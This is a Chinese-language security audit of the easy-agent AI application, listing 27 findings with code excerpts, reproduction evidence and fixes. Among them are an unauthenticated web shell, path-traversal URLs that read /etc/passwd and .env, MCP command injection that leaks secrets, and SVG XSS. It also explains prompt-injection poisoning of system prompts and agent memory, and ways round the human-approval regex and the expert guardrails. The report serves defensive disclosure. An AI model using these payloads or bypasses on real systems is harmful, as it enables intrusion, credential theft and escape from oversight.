# T3 · 安全 / 多用户隔离 / 沙箱审计报告（easy-agent）

> 审计范围：`easy_agent/`（后端 FastAPI + LangGraph/DeepAgents Agent + 沙箱/终端/MCP/上传/鉴权）
> 审计方式：**只读**代码审计 + 真实 `easy_agent.app:app` 进程内 `TestClient` 复现（隔离临时目录 `/tmp/t3test`，独立 SQLite，不触碰业务数据）+ 对运行中服务（`127.0.0.1:8080`，pid 85808，cwd=仓库根）的**只读 GET** 验证。
> 证据基线：`.venv`（Python 3.11.15 / deepagents 0.6.8 / langgraph 1.2.4 / langchain 1.3.4 / fastapi 0.136.3 / langchain-mcp-adapters 0.2.2）。
> 运行环境事实：`AGENT_ENV=dev`（加载 `.env.dev`）；活动配置 `easy_agent/config/config.yaml` 中 `personnel.passwordless_login_enabled: true`、`idle_logout_minutes: 0`、`sandbox_enabled: true`；`bwrap`/`Landlock` 均可用（实测）。
> 约束遵守：未修改任何业务代码/配置；PoC 全部写入 `/tmp/t3test` 或仅做只读请求；报告内所有真实密钥均已脱敏，不复制仓库中的任何密钥值。

---

## 一、结论摘要（按可利用性 / 影响排序，≤10 条）

1. **未认证 Web Terminal 直接给出服务用户 Shell（P0）**：`/terminal` 页面与 `/agent/terminal/ws` WebSocket 无任何认证，服务端 `fork+pty` 以服务进程 OS 用户执行 `bash --login`，`env=os.environ.copy()` 继承 JWT 密钥/LLM API Key/DB 口令；已在隔离进程中实测无 token 执行 `id` 成功。
2. **未认证任意文件读取（P0）**：SPA catch-all `@app.get("/{full_path:path}")` 直接 `os.path.join(frontend_dist, full_path)`，无 `realpath` 校验；编码斜杠可绕过点段归一化。**对运行中的真实服务实测** `/..%2f..%2f…/etc/passwd` → 200；`.env`（1492B）、`data/easy_agent.db`（2.6MB）、`easy_agent/config/config.yaml`、README 全部 200 可读。
3. **未认证账号接管 / 任意建号（P0，配置已开启）**：活动 `config.yaml` 打开 `passwordless_login_enabled: true`，`POST /agent/auth/login-passwordless` 对**已存在用户忽略 user_id、不校验任何凭据**即签发 token（任意用户名→该用户全权限）；对不存在用户名自动建号，绕过 `self_registration_enabled: false`。真机 403 文案已证明该开关处于开启态；隔离环境实测登录任意已存在用户名成功并拿到 `/agent/auth/profile`。
4. **任意登录用户 → 宿主机任意命令执行（P0）**：`PUT /agent/connectors/mcp/raw` / `POST /agent/connectors/mcp` 允许写入任意 stdio MCP `command/args`，`save_mcp_raw → _validate_servers → MultiServerMCPClient.get_tools()` 立即以服务进程 OS 用户拉起子进程；且 `services/mcp.py:163` 的 `_expand_env_recursive` 会把 `${EASY_JWT_SECRET}` 等**服务端环境变量展开进用户可控配置**，实测 `bash -c` 命令执行成功、`${EASY_JWT_SECRET}` 外带成功。与 1/3 组合即为未认证 RCE。
5. **任意登录用户任意文件读取 + 跨用户读取（P1）**：`files.py:282-300 download_file` 对 `{file_path:path}` 不做 resolve/前缀校验、绝对路径直接用；实测读 `/etc/passwd`、读**其他用户 workspace 文件**均 200；`files.py:316-322 parse_file` 对任意 `file_path` 直接解析返回正文（实测 `/etc/passwd` 200）。
6. **未认证身份降级 + 未认证任意文档读取（P1）**：`files.py:343-354 preview_file` token 无效时**不返回 401**，而是 `get_or_create_default_user()`（=admin）继续执行；`target=pdf` 分支先 `convert_to_pdf(full_path)` 再由 `FileResponse` 返回，绕过 `resolve_workspace_file` 校验——实测未认证绝对路径读取任意 `.docx` 并得到 PDF（200 application/pdf），普通分支则被 400 拦截（两条路径均已验证）。
7. **未认证任意 `.md` 文件读写（P1）**：`/agent/prompts/read|update` 无鉴权且 `os.path.join(prompts_base, f"{path}.md")` 未做穿越校验；实测未认证读到 `prompts_base` 外的文件、未认证在 `prompts_base` 外**写入 `.md` 并自动建目录**。可用于覆盖 `easy_agent/config/prompts/system.md`、`fragments/*.md`、任意用户 `memories/{user}/AGENTS.md`（持久化跨用户 Prompt 注入，重启后进入所有用户系统提示词）。
8. **JWT 过期不生效 + 默认永不过期（P1）**：`middleware/auth.py:122` 与 `verify_token_sso` 都用 `decode_access_token(token, verify_exp=False)`；`idle_logout_minutes=0` 时 `never_expires=True` 签发**无 exp 字段** token。实测：exp 已过期的 token 访问 `/agent/auth/profile` 返回 200；登录 token claims 只有 `{sub,v,iat}`。登出/改密仅靠 DB `token_version` 失效，token 泄露即永久有效。
9. **凭据泄露面（P1）**：git **已跟踪**文件 `easy_agent/config/mcp.json:24`、`README.md:259`、`tests/test_config.yaml:61` 硬编码真实 MySQL 口令（`Test****`，dev 库同款，已入库历史）；工作区未跟踪文件 `.env`/`.env.dev` 含真实 DeepSeek/OpenCode/Tavily/RAGFlow 凭据（644 权限）；日志、`sessions/**/*.json`、`data/*.db`、`workspace/*` 均本地 644/755 可读。另：人员默认密码固定 `123456`（`personnel/repository.py:15/127/251`，`api/auth.py:41/484`），且"公共空间管理员"可把任意非 admin 用户重置为该默认密码（`api/auth.py:463-493`）。
10. **其它高价值中危**：MCP 连接器 `url` 用户可控 → SSRF（P2）；文件/会话上传无类型与总大小后端约束、整包读入内存（P2 DoS）；SVG 预览 `inline` 同源渲染 → 存储型 XSS（P2，实测无 `nosniff`）；沙箱 `--share-net` 保留网络 + 无 CPU/内存 rlimit（P2）；HITL 仅正则匹配 `rm` 类命令，`rm -f -r`、`rm --recursive`、`python -c "os.remove(...)"` 均可绕过（实测）；限流在 `BaseHTTPMiddleware` 抛 `HTTPException` 实际返回 **500 而非 429**、且仅进程内/仅 4 条路由（P3）。

> 与需求文档对照：FR-8.1「除登录与健康检查外，所有接口需鉴权」、FR-8.2「数据隔离/归属校验」、FR-7.2 AC2「服务端密钥不传入沙箱」在**命令沙箱内已满足**，但被 Web Terminal / MCP / 文件 API / SPA 兜底四条外围通路整体绕过；FR-11 审计仅覆盖知识库前缀。

---

## 二、问题清单表

> 位置以 `file:line`（行号基于当前工作树）。工作量：S ≤ 0.5 天，M ≤ 2 天，L > 2 天。

| ID | 严重度 | 类别 / CWE | 位置 | 现象与证据 | 风险 / 影响 | 建议修法 | 工作量 |
|---|---|---|---|---|---|---|---|
| T3-01 | **P0** | 缺失鉴权 / CWE-306、CWE-862、CWE-942 | `easy_agent/api/terminal.py:225-228,231-239,242,255,279`；`easy_agent/app.py:69-70,550-551` | `/terminal` 页面与 `/agent/terminal/ws` 无 `Depends(get_current_username)`、无 token/Origin 校验；`await websocket.accept()` 后 `pty.openpty()+os.fork()+os.execvpe("bash", ["bash","--login"], os.environ.copy())`，cwd=`~` | 任何能访问后端端口者（含 Docker 直连 22332）获得服务进程 OS 用户交互式 Shell；可直接读 `.env`/`EASY_JWT_SECRET`/DB 口令、以服务身份攻击内网；无 Origin 校验 → 恶意网页 CSWSH 打开发机（浏览器可连 `ws://127.0.0.1:8080`） | 默认删除该路由或加 `Depends(get_current_username)`+角色白名单；WS 校验 `Origin` 白名单与短时一次性 ticket；shell 降权（独立低权限用户/容器）；env 白名单；功能默认关闭（`ENABLE_WEB_TERMINAL=false`） | S |
| T3-02 | **P0** | 路径穿越 / CWE-22、CWE-552 | `easy_agent/app.py:644-666`（关键 653-657） | `@app.get("/{full_path:path}")` 中 `static_file = os.path.join(frontend_dist, full_path)`，仅 `exists()/isfile()` 后 `FileResponse`，无 `realpath/commonpath` 校验、不拒绝 `..` | **未认证任意文件读取**：`/etc/passwd`、`.env`（真实 API Key）、`data/*.db`（bcrypt 哈希/会话/checkpoint）、`config.yaml`、所有用户 workspace；`os.path.join` 对绝对路径还会丢弃前缀。已在真实运行服务实测 200 | 拒绝含 `..`/NUL/反斜杠路径；`realpath` 后强制 `commonpath==frontend_dist`；改用 `Starlette StaticFiles`/白名单扩展名；SPA 回退只返回 index.html 不映射任意文件；生产前置 nginx 不暴露后端端口 | S |
| T3-03 | **P0** | 认证绕过 / CWE-287、CWE-306 | `easy_agent/api/auth.py:215-296`（233-241）；`easy_agent/config/config.yaml:159-161`（`passwordless_login_enabled: true`）；`easy_agent/db/database.py:2008-2043`（已存在用户忽略 user_id） | `login_passwordless`：策略开启时 `get_or_create_passwordless_user(username, user_id)`，**已存在用户直接返回、无口令/无 user_id 匹配**，随后 `increment_user_token_version` 签发全权限 token；不存在则自动建号（`self_registration` 关闭也生效） | 未认证者仅凭用户名即接管任意非 admin 账号（含"公共空间管理员"）；或自建账号获得完整 Agent 能力（含终端/文件/MCP，见 T3-01/04/05）；真机 403 文案已证明策略开启 | 生产强制默认关闭；开启时必须校验外部 SSO 断言/一次性签名（HMAC+时间戳）而非裸 username；`user_id` 必填且必须匹配；给免密登录单独来源 IP 白名单；admin/manager 一律禁止 | M |
| T3-04 | **P0** | 命令注入 / CWE-78、CWE-94、CWE-732 | `easy_agent/api/connectors.py:599-638,648-694,114-143`；`easy_agent/services/mcp.py:111-134,156-203`（163）；`langchain_mcp_adapters` → `mcp/client/stdio` `anyio.open_process` | 用户可写 `workspace/{user}/mcp.json` 任意 `{"transport":"stdio","command":"sh","args":[...]}`；`save_mcp_raw/add_mcp_server/install` 后立刻 `_validate_servers → client.get_tools()` 拉起进程；`_load_servers_from_file` 的 `_expand_env_recursive` 展开 `${EASY_JWT_SECRET}`/`${DEEPSEEK_API_KEY}` 等进用户配置 | 任意登录用户（含 T3-03 自建号）= **宿主机 RCE（服务 OS 用户）**，绕过 bwrap/Landlock 全部沙箱设计；可读取/外带环境变量中的 JWT 密钥、LLM Key、MySQL 口令；实测命令执行与 `${EASY_JWT_SECRET}` 外带均成功 | stdio 连接器改为"仅管理员白名单 server id + 固定 command"，禁止用户提交/编辑 `command/args/env/cwd`；自定义 server 只允许 http/sse + 域名白名单；`_expand_env_recursive` 对用户 mcp.json 禁用（用户配置不展开服务端 env）；MCP 拉起进程加沙箱/独立低权用户；校验前不执行、改为显式"测试连接"按钮+审计 | M |
| T3-05 | **P1** | 路径穿越 / CWE-22、CWE-639 | `easy_agent/api/files.py:282-300` | `full_path = upload_dir / file_path`（或 `workspace_dir / file_path`）→ `FileResponse(str(full_path))`，无 `resolve_workspace_file`；`Path/绝对路径` 会丢弃前缀 | 任意登录用户读宿主机任意可读文件（`.env`、DB、其他用户 workspace）；实测 `/etc/passwd`、跨用户文件均 200；与 T3-03 组合 = 未认证 | 统一走 `resolve_workspace_file()`（已存在的校验函数）；禁止绝对路径；下载前校验文件名/归属（DB session_files 记录） | S |
| T3-06 | **P1** | 路径穿越 / CWE-22、CWE-552 | `easy_agent/api/files.py:316-322`；`easy_agent/utils/file_parser.py:173-212` | `POST /agent/files/parse?file_path=/etc/passwd` → `parse_file_content(file_path)` 直接 `Path(...).read_text()` 返回正文，无前缀/归属校验 | 任意登录用户读取任意文本/Office/PDF 文件内容（实测 `/etc/passwd` 200，返回 1541 字节）；同样可读其他用户上传文档 | 只允许会话内 `session_files` 记录过的路径；`resolve()` 限定用户目录；解析接口仅服务端内部调用（不暴露为 HTTP） | S |
| T3-07 | **P1** | 鉴权降级 + 路径穿越 / CWE-287、CWE-22 | `easy_agent/api/files.py:343-354`（fallback）、`366-369`、`375-389`、`128-147` | 无有效 token 时 `default_user = db.get_or_create_default_user(); username = default_user.username`（实际为 admin）继续；`full_path=workspace_dir/file_path` 未校验；`target=pdf` 分支 `convert_to_pdf(full_path)` 后直接 `FileResponse`，绕过 `serve_workspace_file→resolve_workspace_file` | 未认证读 admin/default 用户工作区文件；未认证用绝对路径把任意 `.docx/.xlsx/.pptx` 转 PDF 读取（实测 200 application/pdf）；存在性扫描 400/404 oracle；与 T3-02 同类但走不同路由 | 无有效身份直接 401；`/preview` 改用 `resolve_workspace_file`；`target=pdf` 前强制 resolve；`token` 查询参数改为一次性签名（避免 JWT 进 URL） | S |
| T3-08 | **P1** | 缺失鉴权 + 任意文件写 / CWE-306、CWE-22、CWE-94 | `easy_agent/api/prompts.py:27-39,42-55,58-71` | 三个 `prompts_router` 路由均无鉴权依赖；`read: os.path.join(prompts_base, f"{path}.md")`、`update: makedirs(dirname)+open(...,"w")` 均未做穿越校验 | 未认证读/写服务器任意 `.md`（实测读到 base 外文件、在 base 外成功写入并建目录）。可覆盖 `easy_agent/config/prompts/system.md`/`fragments/*.md`（重启后注入所有用户系统提示词）、`memories/{user}/AGENTS.md`（跨用户长期记忆投毒）、技能文档 | 删除该路由或加 `Depends(get_current_username)`+admin 角色；`resolve()` 前缀校验；prompts 只读挂载；写操作加审计与版本备份 | S |
| T3-09 | **P1** | 会话失效不当 / CWE-613 | `easy_agent/middleware/auth.py:122`、`88-111`；`easy_agent/utils/auth.py:73-102`；`easy_agent/api/auth.py:63-71`；`config.yaml:62`；`.env.dev:38`（`IDLE_LOGOUT_MINUTES=0`） | 所有校验 `decode_access_token(..., verify_exp=False)`；`_token_never_expires()` 在 idle=0 时签发**无 exp** token；仅在 DB `token_version` 变化（登录/登出/改密）时失效 | token 一旦泄露（XSS/T3-02 读日志/URL 泄露）可永久重放；30 分钟有效期形同虚设；与"空闲超时"需求 FR-8 不符 | `verify_exp=True`（或至少中间件校验 exp+`iat` 滑动续期）；`never_expires` 仅白名单场景；token 增加 jti 黑名单/短 TTL+refresh；登出后服务端拒绝 | S |
| T3-10 | **P1** | 凭据入库 / CWE-798、CWE-540 | `easy_agent/config/mcp.json:24`（`MYSQL_PASSWORD":"Test****"`）；`README.md:259`；`tests/test_config.yaml:61`；`git log` 已提交（commit 634bb81 等） | 真实 MySQL 口令硬编码在 **git 已跟踪**文件（`git ls-files` 确认），并写入公共连接器目录模版；`.env`/`.env.dev`（未跟踪）含真实 `DEEPSEEK_API_KEY=sk-***`、`OPENCODE_API_KEY=sk-***`、`WEB_SEARCH_API_KEY=tvly-dev-***`、`RAGFLOW_API_KEY=ragflow-***`，文件 644 | 拿到仓库/历史者获得数据库与模型/搜索凭据；公共目录安装连接器会把默认口令写进用户 mcp.json；本机其他 OS 用户可读 `.env*` | 立即轮换所有已暴露 key/口令；从工作树与 git 历史移除（`git filter-repo`/BFG），改用 `.env`+Secret 管理；示例文件只留占位；`.env*` chmod 600；mcp.json 目录不含真实值 | M |
| T3-11 | **P1** | 弱默认口令 / 权限提升 / CWE-521、CWE-269 | `easy_agent/personnel/repository.py:15,127,251`；`easy_agent/personnel/models.py:128`；`easy_agent/api/auth.py:41,484`；`easy_agent/api/auth.py:463-493`；`easy_agent/knowledges/core/repository.py:222-238` | 人员新增/Excel 导入统一 `hash_password("123456")` 并在响应回显；`admin_reset_password` 允许 `is_team_space_manager` 把任意非 admin 用户重置为 `EASY_DEFAULT_RESET_PASSWORD`（默认 123456）；无首次登录强制改密 | 知道工号/用户名即可用 `123456` 登录新用户；"公共空间管理员"（非 admin）可批量接管普通用户账号（重置为固定口令）→ 横向越权 | 随机初始口令+首次登录强制改密；重置走一次性链接/管理员审核；默认口令从环境注入且长度≥12；manager 重置普通用户需二次确认+审计 | M |
| T3-12 | **P2** | SSRF / CWE-918 | `easy_agent/api/connectors.py:203-265,476-507,515-573`；`easy_agent/services/mcp.py:156-203`；`langchain_mcp_adapters/client.py` | 自定义连接器 `url`（sse/http）由用户任意填写，保存/查看工具时服务端发起连接；`/connectors/mcp` 可写任意 url | 服务端向 127.0.0.1/内网/云元数据（169.254.169.254）发起请求，探测/读取内网服务（含本服务未授权接口）；可做端口扫描 | url 域名/协议白名单；禁止私网地址与元数据 IP；出站代理；连接仅管理员预置 | M |
| T3-13 | **P2** | 资源耗尽 / CWE-400、CWE-434 | `easy_agent/api/files.py:238-279`；`easy_agent/api/sessions.py:388-428`（先整包 `await file.read()` 再校验）；无全局 body size 限制；前端/文档声明的 R2/R3 后端未实现（grep `max_files_per_message` 仅 settings 下发） | `/agent/files/upload` 无大小/类型限制；会话上传在 413 判断前已把整个 body 读入内存；uvicorn 默认无 body 上限（仅 nginx 100m） | 大文件/大量并发上传 → 内存/磁盘耗尽 DoS；上传任意类型（含 SVG）配合预览 XSS | 流式落盘+边读边计大小；`Content-Length`/分块上限；扩展名+魔数白名单；chat 侧落实 R2/R3 与 `files` 数量校验；全局请求体中间件 | M |
| T3-14 | **P2** | 存储型 XSS / CWE-79 | `easy_agent/api/files.py:35-76,128-147`（`.svg→image/svg+xml` + `inline`）；`easy_agent/app.py:434-437`（安全响应头只加在静态分支）；实测响应无 `X-Content-Type-Options` | workspace 内 SVG 经 `/agent/files/preview` 以 `image/svg+xml`、`Content-Disposition: inline` 返回；顶层打开时 SVG 内 `<script>` 在应用同源执行（实测 200 + inline + 无 nosniff） | 任一用户（含 T3-03 自建号）可构造恶意 SVG，诱导受害者打开 `/agent/files/preview?file_path=…&token=…` → 读取受害者 localStorage 中 JWT → 账号接管；结合 T3-09 永久有效 | SVG 强制 `application/octet-stream`+attachment 或独立 sandbox 域名；补 `CSP: sandbox`/`X-Content-Type-Options: nosniff`；预览域名与主站隔离；禁止 inline 渲染用户可控内容 | M |
| T3-15 | **P2** | 沙箱逃逸面（网络/资源）/ CWE-693 | `easy_agent/sandbox.py:148,193`（`--share-net`）、`245-255`（仅 timeout，无 rlimit）；`easy_agent/agent.py:628-637`（timeout=120）；`deepagents/middleware/filesystem.py:706,1465-1479`（模型可控 timeout ≤3600s）；`easy_agent/backends/shell.py:135-173` | bwrap/Landlock 文件系统隔离实测有效（读 `/tmp` 外文件被拒、env 密钥被剥离），但：网络全通（`--share-net`）；无 CPU/内存/进程数 rlimit；Landlock 回退无 PID namespace；每命令 timeout 可被模型设到 3600s | 提示注入可让 Agent `curl` 外发用户文档/内网探测（沙箱内 env 已脱敏，但用户文件可外带）；fork 炸弹/内存耗尽在 Landlock 回退（无 PID ns）可拖垮宿主机；SSRF 至 localhost 未授权接口 | 增加 `--unshare-net` 或网络白名单代理；`resource.setrlimit`（CPU/AS/NPROC/FSIZE）；限制 timeout 上限与并发；Landlock 回退补 cgroup/rlimit；默认禁网 | M |
| T3-16 | **P2** | HITL 绕过 / CWE-184、CWE-78 | `easy_agent/hitl.py:10-32,65-68,121-132`；`easy_agent/agent.py:467-493` | `execute` 审批仅对 `_is_destructive_command` 正则（`\brm\b/unlink/shred/find -delete…`）触发；目录删除另用 `_DIR_DELETION_PATTERNS` 在执行层拒绝。实测：`rm -rf dir`→目录删除拦截；但 `rm -f -r dir`、`rm --recursive dir` → 判为"普通删除"进入审批且可被执行；`python -c "os.remove(...)"`、`truncate`、`mv`、`curl` 等完全不触发审批 | 用户批准"删一个文件"实际执行递归删目录（沙箱内仍限工作区，但可清空用户交付物）；提示注入可绕过 HITL 做外发/覆盖类新增危险操作 | 用 shell AST/白名单而非正则；所有 `rm` 一律按递归风险审批；`execute` 增加"网络访问/写配置/安装依赖"等分类审批；目录删除统一拒绝；HITL 记录决策审计 | M |
| T3-17 | **P2** | 凭据泄漏到日志 / CWE-532 | `easy_agent/api/files.py:330,349-351`；`easy_agent/api/scheduled_tasks.py:225-228`；`easy_agent/initialization/log.py:23,187-199` | JWT 可放 query（`?token=`）；`uvicorn.access` 全量 URI 写入 `logs/comm-*`、`logs/proc-*`（实测访问日志含完整 query string） | token（默认永不过期，T3-09）进入日志/浏览器历史/Referer；日志 644 可被其他本地用户读取；泄露即长期账号接管 | query token 改一次性短签名（60s、绑定路径+用户）；访问日志脱敏 query；日志/会话文件 600；禁止在 URL 放长期凭据 | S |
| T3-18 | **P2** | 本地凭据暴露 / CWE-732、CWE-311 | 实测权限：`.env/.env.dev/.env.prod` 644；`logs/*.log` 644；`sessions/**/*.json` 644（全量对话）；`data/easy_agent.db` 644（用户/bcrypt/会话）；`workspace/*` 755；`.env` 内含真实 key（见 T3-10） | 服务主机其他 OS 用户/误挂载容器可读取密钥、全部用户会话与上传文件；`data/.jwt_secret` 600（正面） | 最小化共享主机多租户；`chmod 600`/umask 077；数据库与 workspace 加密或专用卷；容器内仅挂载必要路径 | S |
| T3-19 | **P2** | 部署配置 / CWE-1188、CWE-250 | `docker-compose.yml`（`ports: "22332:8000"` 直接暴露后端、`env_file: .env.dev`、无 `user:`/`read_only`）；`Dockerfile`（无 `USER`，默认 root）；`deploy/k8s/agent-deployment.yaml:61-66`（`capabilities.add: ["SYS_ADMIN"]`，`allowPrivilegeEscalation:false`） | 后端 8000 端口绕过 nginx 直连，T3-01/02/08 全部可达；容器 root 放大 RCE 影响；k8s 虽 nonroot 但加 SYS_ADMIN（bwrap 本身用不到，注释亦称无需 SYS_ADMIN） | 后端只 listen 127.0.0.1/仅集群内网；compose 不 publish 后端端口；容器非 root+只读根；移除 SYS_ADMIN（k8s 需求改为 seccomp=unconfined 等）；Secret 不入 env_file/镜像 | M |
| T3-20 | **P3** | 审计缺失 / CWE-778 | `easy_agent/knowledges/runtime/observability.py:93-101`（`_AUDITED_PREFIXES=("/agent/knowledge/v1",)`）；`easy_agent/app.py:450-467` | DB 审计表只记知识库前缀；登录/登出/失败登录/文件下载/终端/连接器写入/提示词写入/专家变更均不入库（仅文件日志），日志可被进程内改写/删除；`should_audit` 忽略 method | 事后无法追责高危操作（终端 RCE、任意文件读、MCP 写入）；不满足 FR-11「关键业务事件可审计」 | 统一审计中间件：认证事件、文件读写、connector/prompt/expert 写、terminal 建连；append-only/远端 SIEM；审计含 actor/ip/对象/hash；审计日志独立权限 | M |
| T3-21 | **P3** | 限流实现缺陷 / CWE-770 | `easy_agent/middleware/rate_limit.py:16-25,44-61`；`easy_agent/app.py:391` | 只覆盖 login/login-passwordless/chat/stream/resume 共 4 条；进程内计数（多 worker/多 pod 可绕过）；key 为 `request.client.host`（反代后所有用户共享一个桶；不读 XFF，反而可被全局打满）；`raise HTTPException` 在 `BaseHTTPMiddleware` 中抛出，**实测返回 500 而非 429** | 暴力破解/建号接口可横向多进程绕过；正常用户被反代共享桶误伤；429 语义丢失（客户端不重试） | 用应用内依赖+共享存储（Redis/DB）限流；按 `get_client_ip` 与账号双维度；返回 JSONResponse 429+Retry-After；覆盖全部写接口 | M |
| T3-22 | **P3** | CORS/安全头/信息暴露 / CWE-16、CWE-200 | `easy_agent/app.py:369-390`（dev 默认 `*`，`allow_credentials=false`）；`easy_agent/app.py:434-437`（安全头只加在 skip 分支）；实机 `/docs`、`/openapi.json` 200 未授权；`/agent/config` 未授权返回 provider/model | 开发/默认部署 `Access-Control-Allow-Origin: *`，任意站点可跨域读取所有**未认证**接口（含 T3-02/08 的文件读取）；API 响应缺 `X-Content-Type-Options/X-Frame-Options/CSP`；OpenAPI/Redoc 暴露完整攻击面 | 默认 `*` 仅限 `dev`；所有响应统一加安全头与 CSP；生产关闭 `/docs`、`/openapi.json`；`/agent/config` 加鉴权或删减 | S |
| T3-23 | **P3** | IDOR / CWE-639 | `easy_agent/api/connectors.py:428-473`（`/session` GET/POST 未校验 session 归属）；`easy_agent/api/chat.py:631-659`（`/cancel` 未 `get_owned_session`） | 任意登录用户对**他人 session_id** 读取/写入会话级连接器开关、取消他人流式任务（session_id 为 UUID，需先泄露） | 会话级状态篡改/DoS；与 T3-02 日志/SQL 泄露 session_id 后可组合 | 两个接口补 `get_owned_session(db, session_id, username)`；统一走会话归属 helper | S |
| T3-24 | **P3** | 受限路径穿越 / CWE-22 | `easy_agent/api/skill_center.py:496`（`add-skill` 的 `skills_root/dir_name` 未校验，可复制任意含 `SKILL.md` 的目录到自己的技能库）；`390-398`（`scope=public` 的 `dir_name` 未校验，可读任意含 `README.md/SKILL.md` 目录正文）；`easy_agent/services/public_expert_service.py:393-412`（`root / expert_id` 未校验，可把任意含 `*.md` 目录当"公共专家"读取其 md 作为系统提示词） | 登录用户可读他人技能内容/任意 `.md`；公共专家 ID 穿越可把任意目录 `.md` 注入自己的专家提示词（自伤为主） | 目录名白名单 `^[a-z0-9][a-z0-9_-]{0,63}$`；`resolve()+commonpath` 校验；专家 ID 只允许列表内 ID | S |
| T3-25 | **P3** | 提示词级边界 / CWE-602 | `easy_agent/services/expert_guardrail.py`（docstring 明示"软约束"）；`easy_agent/services/expert_relevance.py:272-303`（关键词黑名单+LLM 分类）；`easy_agent/api/expert.py:619-697`（预检 fail-open） | 专家边界=系统提示词追加段+输入侧关键词/LLM 预检；"删除/修改文件"红线靠 `"删除","rm -rf",…` 关键词，可被"清空/重写/移到回收站/用脚本处理"等表述绕过；预检异常/超时放行 | 专家模式并非硬边界（FR 要求专家不执行高危操作）；用户可借专家会话做越界操作；但高危命令仍受沙箱+HITL 限制（P3） | 明确声明专家边界为软约束；高危工具在专家会话中直接禁用（工具级过滤而非提示词）；预检 fail-closed 可配；关键词改为工具级策略 | M |
| T3-26 | **P3** | 用户枚举/口令策略 / CWE-204、CWE-521 | `easy_agent/api/auth.py:169-177`（停用账号返回 403 文案、未知用户 401，实测 403 vs 401）；`models/api.py:229-243`（密码 min_length 3/4，无复杂度）；登录未找到用户时不做 bcrypt（时序差异） | 可枚举有效账号/停用账号；弱口令可注册/重置为 4 位 | 统一 401 文案与恒定时间；密码策略≥8+复杂度；登录失败按账号+IP 限流 | S |
| T3-27 | **P3** | 信息泄漏 / CWE-209、CWE-200 | `easy_agent/api/files.py:273-279`（上传返回服务端绝对路径）；`easy_agent/api/files.py:381-383`（转换失败 `detail=f"文档转换失败: {e}"` 携带 LibreOffice stderr/内部路径）；`easy_agent/app.py:608-628`（`/agent/config`、`/api/config` 未授权返回 provider/model） | 内部路径/组件信息泄露，辅助 T3-02/05 精确利用；错误信息包含转换器 stderr | 响应只返回相对路径；错误统一脱敏（保留 request_id）；`/agent/config` 加鉴权 | S |

---

## 三、详细分析与复现

### 3.0 攻击面地图与鉴权覆盖（摘录）

对 `easy_agent/app.py` 注册的全部 router 用脚本构建了「路由 × 依赖」矩阵（`APIRouter.routes[].dependant` 递归取依赖名）。**无鉴权依赖**的接口如下（除健康检查/静态资源）：

| 方法 | 路径 | 说明 |
|---|---|---|
| POST | `/agent/auth/register` | 由 `self_registration_enabled` 控制（当前 false） |
| POST | `/agent/auth/login` | 公开 |
| POST | `/agent/auth/login-passwordless` | 公开，**当前配置开启**（T3-03） |
| GET | `/agent/settings/models`、`/web-search`、`/upload-limits` | 公开配置（信息量可接受） |
| POST | `/agent/completion/chat` | 公开 LLM 代理（P2/P3，见 §3.11） |
| POST | `/agent/prompts/query`、`/read`、`/update` | **公开且可穿越读写文件（T3-08）** |
| GET | `/agent/files/preview` | 无 Depends，内部自行 token 校验，失败降级 default 用户（T3-07） |
| GET | `/agent/public-list` | 公共专家列表（实机 200） |
| GET | `/terminal`、WS `/agent/terminal/ws` | **公开交互式 Shell（T3-01）** |
| GET | `/api/personnel/login-policy` | 公开开关 |
| GET | `/`、`/{full_path:path}` | SPA 静态兜底 → **路径穿越（T3-02）** |
| GET | `/docs`、`/openapi.json` | 实机 200 未授权 |

其余接口（sessions/chat/files 除 preview/expert/connectors/scheduled-tasks/settings 有鉴权部分/knowledge/personnel）均有 `Depends(get_current_username)`，且多数通过 `utils/session.py:get_owned_session` 做会话归属校验（该 helper 实现正确：不存在/他人都 404，不泄露存在性）。**`X-Username` 回退已被移除**：实测 `GET /agent/sessions` 带 `X-Username: admin` 无 Authorization → 401；`middleware/auth.py:114-151` 只在 Bearer 有效时返回用户名，否则 401（CLAUDE.md/AGENTS.md 中"X-Username 回退 / default 回退"描述已过时，属文档漂移）。

### 3.1 T3-01 未认证 Web Terminal（P0）

代码路径：`app.py:69-70` 仅 Windows 不加载 terminal router；`app.py:550-551` Linux 无条件 `include_router(terminal_router)`。

```python
# easy_agent/api/terminal.py:225-242
@router.get("/terminal", response_class=HTMLResponse, summary="Web 终端页面")
async def terminal_page():
    return HTMLResponse(content=TERMINAL_HTML)

@router.websocket("/agent/terminal/ws")
async def terminal_ws(websocket: WebSocket):
    """WebSocket 终端接口。 ... 无需认证，直接连接即可使用。"""
    await websocket.accept()
    cwd = os.path.expanduser("~")
    ...
    env = os.environ.copy()          # ← 继承 EASY_JWT_SECRET / LLM Key / MYSQL_PASSWORD
    pid = os.fork()
    ...
    os.execvpe("bash", ["bash", "--login"], env)   # ← 服务 OS 用户交互式 shell
```

- 无 `Depends(get_current_username)`、无 `Origin` 校验 → 任意站点可发起 CSWSH（浏览器允许网页连任意 `ws://`，服务端不校验 Origin）。
- 实机只读验证：`GET /terminal` → 200；`GET /agent/terminal/ws`（HTTP）→ 404（路由仅 WS）。
- 隔离进程内（真实 `easy_agent.app:app` + TestClient）实测：

```
[终端会话已创建 | user=sututu | pid=48331 | cwd=/home/sututu]
发送: id; echo T3SHELL-MARKER\r
收到: ...$ id; echo T3SHELL-MARKER
      uid=1000(sututu) gid=1000(sututu) groups=1000(sututu),4(adm),24(cdrom),27(sudo),...
```

即**未携带任何凭证**即可获得以服务用户身份执行的 shell；该用户属于 `sudo` 组。修复见表格。

### 3.2 T3-02 SPA 兜底路径穿越（P0，含真机证据）

```python
# easy_agent/app.py:644-666（节选）
@app.get("/{full_path:path}", response_class=FileResponse)
async def serve_static(full_path: str):
    if full_path == "agent" or full_path.startswith("agent/"):
        return JSONResponse({"detail": "Not Found"}, status_code=404)
    static_file = os.path.join(frontend_dist, full_path)   # ← 无 realpath/前缀校验
    if os.path.exists(static_file) and os.path.isfile(static_file):
        return FileResponse(static_file, headers={"Cache-Control": "no-cache"})
```

- `full_path` 来自 URL 路径（已 percent-decode）。用编码斜杠 `..%2f..%2f` 可避开客户端/httpx 的点段归一化；服务端 `os.path.join` 直接拼接后交给 `FileResponse`，**无 `..` 过滤、无 `realpath` 包含校验**。
- 对运行中的服务（`127.0.0.1:8080`，仓库根启动）只读验证（`curl --path-as-is`，未保存敏感内容，仅状态码/大小）：

```
/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd                    -> 200, 1472 bytes, 首行 root:x:0:0:root:/root:/bin/bash
/..%2f..%2fdata%2feasy_agent.db                                -> 200, 2605056 bytes
/..%2f..%2f.env                                                -> 200, 1492 bytes   ← 含真实 API Key（未落盘、未复制）
